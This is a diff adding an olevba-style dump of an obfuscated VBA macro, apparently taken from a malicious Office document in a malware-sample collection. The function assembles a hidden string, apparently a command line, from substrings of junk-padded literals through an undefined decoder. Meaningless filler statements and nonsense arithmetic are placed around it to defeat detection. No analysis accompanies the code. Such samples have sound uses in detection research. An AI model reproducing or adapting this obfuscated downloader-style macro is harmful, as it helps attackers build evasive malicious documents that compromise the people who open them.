@@ -1,0 +1,49 @@
+Filename     : ./macros/c91c56b63f928c8eb917a28022b10c7421117db1a328290d9c5b4d736e96408e
+OLE stream   : Macros/VBA/CqdoNRFYL
+VBA filename : CqdoNRFYL.bas
+----------------------------------------
+Attribute VB_Name = "CqdoNRFYL"
+Function wTtjDZMDPz()
+On Error Resume Next
+cqhYrHfCjTKKk.tTiEfbzUtKiHpAsZcHiqYhfGloqR.hAFkZoHbijIDIzXqjRfKKrCc.YMobTrkhjLJdXPLkzuaZmPkIQBWL
+DUcHjUdKjsN = ytgUBhjkgbksad("qlGnZN8oAD%XVI8ONj)Z[N@ms[/         Vs", 2, 11)
+cqhYrHfCjTKKk.tTiEfbzUtKiHpAsZcHiqYhfGloqR.hAFkZoHbijIDIzXqjRfKKrCc.YMobTrkhjLJdXPLkzuaZmPkIQBWL
+rTPSbVtBIwMuLciKznVCujBjPEvv.IiShbKMGBoiclDpPXqAaabIAqz.RfDXZwMAUtNkSRE.zqZJdLTsNuVOjVRrbzuawQFiZDVW
+sJRSmwKUw = ytgUBhjkgbksad("ip    c9TN[57.Sqm0J", 13, 5)
+rTPSbVtBIwMuLciKznVCujBjPEvv.IiShbKMGBoiclDpPXqAaabIAqz.RfDXZwMAUtNkSRE.zqZJdLTsNuVOjVRrbzuawQFiZDVW
+wZEJkYicAjkVWuqWc.qbpcKltRRkqCjTuOZXHSOt.hiIlViFJNOQDiZWO.QTHzmwDQaIUTPJOwNH
+HqMZFVVnRoH = ytgUBhjkgbksad("XD0     %cEtN0zlXM8KZjppo", 15, 8)
+wZEJkYicAjkVWuqWc.qbpcKltRRkqCjTuOZXHSOt.hiIlViFJNOQDiZWO.QTHzmwDQaIUTPJOwNH
+jkcTYPiXowbFijjZCbAsUj.jowaprkEovkZuEbIEfjLtDCYwj.wwZiKAvvicpofEsmKzGoVbSwNl.wdlXbJAlGOQaZzIwjOqD
+RbutEsP = ytgUBhjkgbksad("MZE)Tvo^C%  d%iNT", 6, 6)
+jkcTYPiXowbFijjZCbAsUj.jowaprkEovkZuEbIEfjLtDCYwj.wwZiKAvvicpofEsmKzGoVbSwNl.wdlXbJAlGOQaZzIwjOqD
+EkAzcUdwZBDGPzzwYMLXXRDwsCUww.YIDHtrkiRWhFUiRkwPlrGAhnamh.HaAfzhduCHFG.tupqSwUhHGFMElXa
+VSYuowZ = ytgUBhjkgbksad("_Rv.ENOOOJ<2vDcE#5/            %cEp^S^mt#jFtqu", 8, 21)
+EkAzcUdwZBDGPzzwYMLXXRDwsCUww.YIDHtrkiRWhFUiRkwPlrGAhnamh.HaAfzhduCHFG.tupqSwUhHGFMElXa
+awwOzMQHGADoGsI.wpriHiWTwHUNKCd.rQkiqSvKPvqMiPmGFcuAiwCwb.PpsCzDXRzpIiVduhOLnJoj
+SzjXb = ytgUBhjkgbksad("ZtztkBr(VuUp2z!Y_OQp^4.X7$jZrV", 10, 2)
+awwOzMQHGADoGsI.wpriHiWTwHUNKCd.rQkiqSvKPvqMiPmGFcuAiwCwb.PpsCzDXRzpIiVduhOLnJoj
+zwXlOncdLzSzJLTFYzJCfkUCqasw.MTpFlzXPZsEzbjpEpQCTB.mGIPMiUvnvdBwjdsYOwpwFEFEAf.AKpibVhjzVktuiEJTalJbzsoXLtjB
+XzmCwA = ytgUBhjkgbksad("idQ%u%Y%5TrQ87pEGrVboVTSJT", 7, 1)
+zwXlOncdLzSzJLTFYzJCfkUCqasw.MTpFlzXPZsEzbjpEpQCTB.mGIPMiUvnvdBwjdsYOwpwFEFEAf.AKpibVhjzVktuiEJTalJbzsoXLtjB
+mZEKMLdZmBQGfoWhHjjdic.wDzZLQpPooFZhFpRaup.ofhdBRFsTkWvKCFGPlRJzlcRZP.bSPJjtmhTWUYuLzwDRKOiziCod
+OSGNBwt = ytgUBhjkgbksad("Xz & GlintSCWcWz qnVw$Qj77$X]", 10, 18)
+mZEKMLdZmBQGfoWhHjjdic.wDzZLQpPooFZhFpRaup.ofhdBRFsTkWvKCFGPlRJzlcRZP.bSPJjtmhTWUYuLzwDRKOiziCod
+PdpzNlADzwcmtfNHQIi.KkZiziWSIVqbjSoIYjwrYfnFvQq.kTIjQoKfDKwfPivcG.FaqEijMrVfwU
+XmiPjshKt = ytgUBhjkgbksad("q!$77#jJjaQuVuNBFz dmcs)$dJ$Vuq7G$UkE$d59Atj<DnZ_J5c5", 32, 15)
+PdpzNlADzwcmtfNHQIi.KkZiziWSIVqbjSoIYjwrYfnFvQq.kTIjQoKfDKwfPivcG.FaqEijMrVfwU
+fbLYpiDzdWivAzvqXXoTaI.KzMMjbVLBQmQQRtFTE.HfwKEPFbjXLvEW.AYdSUWHLhiNjfY
+nLNGdaNMiT = ytgUBhjkgbksad("nFCJwXRhWS^mo^C%    5f_!2rht", 9, 11)
+fbLYpiDzdWivAzvqXXoTaI.KzMMjbVLBQmQQRtFTE.HfwKEPFbjXLvEW.AYdSUWHLhiNjfY
+mvaNnCimTHSOhsIpo.lPjbiOvkbwioFs.WELQbZzwSXhrQUkSjaUqRjLMMSDaf.fCZRKnzZNjoSNDB
+JARpbflkEDw = ytgUBhjkgbksad("z2dqVD 0cq4_Vz", 8, 1)
+mvaNnCimTHSOhsIpo.lPjbiOvkbwioFs.WELQbZzwSXhrQUkSjaUqRjLMMSDaf.fCZRKnzZNjoSNDB
+IbbsLvzPZqHRGTFi.cjDadQlEpBYZRiIXmha.TqCfOjDPuZXJ.DPZKmfLpoWub
+PCZki = ytgUBhjkgbksad("GHiXAWts[pThFwPTKOQSwtZhiUOXZOjFwzbD#twMCAiNMZaiwpqZ", 17, 23)
+IbbsLvzPZqHRGTFi.cjDadQlEpBYZRiIXmha.TqCfOjDPuZXJ.DPZKmfLpoWub
+ddNVQtzHYPsiPiGCwqJjXKjc.GPwTPvKXQwttIKllDfXcPF.cdQSbQLTtlrKiBnIUi.zhMIojXuUiLzOA
+YzFFnbFvt = ytgUBhjkgbksad("rPiR[[Xc<       d)pOqjd8_bN", 12, 7)
+ddNVQtzHYPsiPiGCwqJjXKjc.GPwTPvKXQwttIKllDfXcPF.cdQSbQLTtlrKiBnIUi.zhMIojXuUiLzOA
+wTtjDZMDPz = XmiPjshKt + XzmCwA + JARpbflkEDw + PCZki + OSGNBwt + nLNGdaNMiT + SzjXb + HqMZFVVnRoH + RbutEsP + VSYuowZ + DUcHjUdKjsN + sJRSmwKUw + YzFFnbFvt
+vVqzcjGFd = IQAH * PWDuIG / PUbmDV - Round(8278775 * CSng(7921955 * CInt(ldKif)) + JrzAtE - Round(AYjP)) - 544 / EHIF + tJGV / Rnd(qfkOo) * (3537002 / CDbl(4476655) + (qZESML / CByte(8999464 / CDbl(1559553) - 2495182 / 6548833)))
+End Function
